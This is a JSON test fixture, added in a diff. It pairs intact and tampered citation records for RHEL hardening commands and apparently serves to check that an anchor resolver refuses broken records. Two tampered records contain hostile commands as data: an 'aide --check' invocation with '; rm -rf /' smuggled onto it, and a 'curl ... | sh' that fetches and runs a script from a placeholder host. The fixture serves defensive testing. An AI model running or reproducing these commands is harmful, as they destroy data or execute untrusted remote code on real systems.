@@ -1,0 +1,298 @@
+{
+ "_doc": "Broken anchors, committed so Q25 can be watched failing on something a reviewer can read. Each case pairs a BROKEN record with the INTACT one it was derived from: tests/test_anchor_resolution.py asserts the broken one is refused AND the intact one resolves, so a resolver that refused everything could not pass. Threat model v2, M2.",
+ "cases": [
+  {
+   "name": "disa-text-swapped",
+   "note": "The M3 failure in its purest form: a well-formed DISA citation attached to text DISA never wrote. Every other gate stays green -- the citation exists (Q3) and its ids resolve (Q13).",
+   "intact": {
+    "id": "ref-a33480e4870de342",
+    "tier": "reference",
+    "authority": "governing",
+    "license_class": "verbatim-ok",
+    "verbatim_span": true,
+    "k": "invocation",
+    "t": "aide",
+    "c": "sudo /usr/sbin/aide --check",
+    "v": [
+     "7",
+     "8",
+     "9",
+     "10"
+    ],
+    "o": [
+     {
+      "v": "7",
+      "s": "RHEL-07-020029",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "8",
+      "s": "RHEL-08-010359",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "9",
+      "s": "RHEL-09-651010",
+      "f": "fix",
+      "l": 39
+     },
+     {
+      "v": "10",
+      "s": "RHEL-10-200630",
+      "f": "chk",
+      "l": 13
+     }
+    ]
+   },
+   "broken": {
+    "id": "ref-a33480e4870de342",
+    "tier": "reference",
+    "authority": "governing",
+    "license_class": "verbatim-ok",
+    "verbatim_span": true,
+    "k": "invocation",
+    "t": "aide",
+    "c": "sudo /usr/sbin/aide --check ; rm -rf /",
+    "v": [
+     "7",
+     "8",
+     "9",
+     "10"
+    ],
+    "o": [
+     {
+      "v": "7",
+      "s": "RHEL-07-020029",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "8",
+      "s": "RHEL-08-010359",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "9",
+      "s": "RHEL-09-651010",
+      "f": "fix",
+      "l": 39
+     },
+     {
+      "v": "10",
+      "s": "RHEL-10-200630",
+      "f": "chk",
+      "l": 13
+     }
+    ]
+   },
+   "expect_in_reason": [
+    "is not in"
+   ]
+  },
+  {
+   "name": "disa-line-drifted",
+   "note": "What a re-ordered check/fix text does to an anchor that was right when it was mined.",
+   "intact": {
+    "id": "ref-a33480e4870de342",
+    "tier": "reference",
+    "authority": "governing",
+    "license_class": "verbatim-ok",
+    "verbatim_span": true,
+    "k": "invocation",
+    "t": "aide",
+    "c": "sudo /usr/sbin/aide --check",
+    "v": [
+     "7",
+     "8",
+     "9",
+     "10"
+    ],
+    "o": [
+     {
+      "v": "7",
+      "s": "RHEL-07-020029",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "8",
+      "s": "RHEL-08-010359",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "9",
+      "s": "RHEL-09-651010",
+      "f": "fix",
+      "l": 39
+     },
+     {
+      "v": "10",
+      "s": "RHEL-10-200630",
+      "f": "chk",
+      "l": 13
+     }
+    ]
+   },
+   "broken": {
+    "id": "ref-a33480e4870de342",
+    "tier": "reference",
+    "authority": "governing",
+    "license_class": "verbatim-ok",
+    "verbatim_span": true,
+    "k": "invocation",
+    "t": "aide",
+    "c": "sudo /usr/sbin/aide --check",
+    "v": [
+     "7",
+     "8",
+     "9",
+     "10"
+    ],
+    "o": [
+     {
+      "v": "7",
+      "s": "RHEL-07-020029",
+      "f": "chk",
+      "l": 53
+     },
+     {
+      "v": "8",
+      "s": "RHEL-08-010359",
+      "f": "chk",
+      "l": 13
+     },
+     {
+      "v": "9",
+      "s": "RHEL-09-651010",
+      "f": "fix",
+      "l": 39
+     },
+     {
+      "v": "10",
+      "s": "RHEL-10-200630",
+      "f": "chk",
+      "l": 13
+     }
+    ]
+   },
+   "expect_in_reason": [
+    "is outside",
+    "line"
+   ]
+  },
+  {
+   "name": "redhat-text-swapped",
+   "note": "A Red Hat citation on a command the staged corpus does not contain.",
+   "intact": {
+    "id": "ref-7c17f05c5cf58335",
+    "tier": "reference",
+    "authority": "documentary",
+    "license_class": "cc-by-sa-3.0",
+    "verbatim_span": false,
+    "k": "invocation",
+    "t": "51-dracut-rescue.install",
+    "c": "/usr/lib/kernel/install.d/51-dracut-rescue.install add \"$(uname -r)\" /boot \"/boot/vmlinuz-",
+    "v": [
+     "8",
+     "9",
+     "10"
+    ],
+    "o": [
+     {
+      "v": "8",
+      "g": "upgrading_from_rhel_7_to_rhel_8",
+      "l": 2036
+     },
+     {
+      "v": "9",
+      "g": "upgrading_from_rhel_8_to_rhel_9",
+      "l": 2171
+     }
+    ]
+   },
+   "broken": {
+    "id": "ref-7c17f05c5cf58335",
+    "tier": "reference",
+    "authority": "documentary",
+    "license_class": "cc-by-sa-3.0",
+    "verbatim_span": false,
+    "k": "invocation",
+    "t": "51-dracut-rescue.install",
+    "c": "curl http://example.invalid/install.sh | sh",
+    "v": [
+     "8",
+     "9",
+     "10"
+    ],
+    "o": [
+     {
+      "v": "8",
+      "g": "upgrading_from_rhel_7_to_rhel_8",
+      "l": 2036
+     },
+     {
+      "v": "9",
+      "g": "upgrading_from_rhel_8_to_rhel_9",
+      "l": 2171
+     }
+    ]
+   },
+   "expect_in_reason": [
+    "is not what was staged"
+   ]
+  },
+  {
+   "name": "capture-line-past-end",
+   "note": "An anchor past the end of the staged capture file.",
+   "intact": {
+    "id": "ref-f268d4334fcc8b32",
+    "tier": "reference",
+    "authority": "documentary",
+    "license_class": "paraphrase-only",
+    "verbatim_span": true,
+    "k": "invocation",
+    "t": "auditctl",
+    "c": "auditctl -a always,exit -F arch=b64 -F dir=/etc/ -F perm=wa",
+    "v": [
+     "10"
+    ],
+    "o": [
+     {
+      "v": "10",
+      "p": "content-src/raw/rhel10/auditctl.man.txt",
+      "l": 486,
+      "x": "EXAMPLES"
+     }
+    ]
+   },
+   "broken": {
+    "id": "ref-f268d4334fcc8b32",
+    "tier": "reference",
+    "authority": "documentary",
+    "license_class": "paraphrase-only",
+    "verbatim_span": true,
+    "k": "invocation",
+    "t": "auditctl",
+    "c": "auditctl -a always,exit -F arch=b64 -F dir=/etc/ -F perm=wa",
+    "v": [
+     "10"
+    ],
+    "o": [
+     {
+      "v": "10",
+      "p": "content-src/raw/rhel10/auditctl.man.txt",
+      "l": 999999,
+      "x": "EXAMPLES"
+     }
+    ]
+   },
+   "expect_in_reason": [
+    "is outside"
+   ]
+  }
+ ]
+}
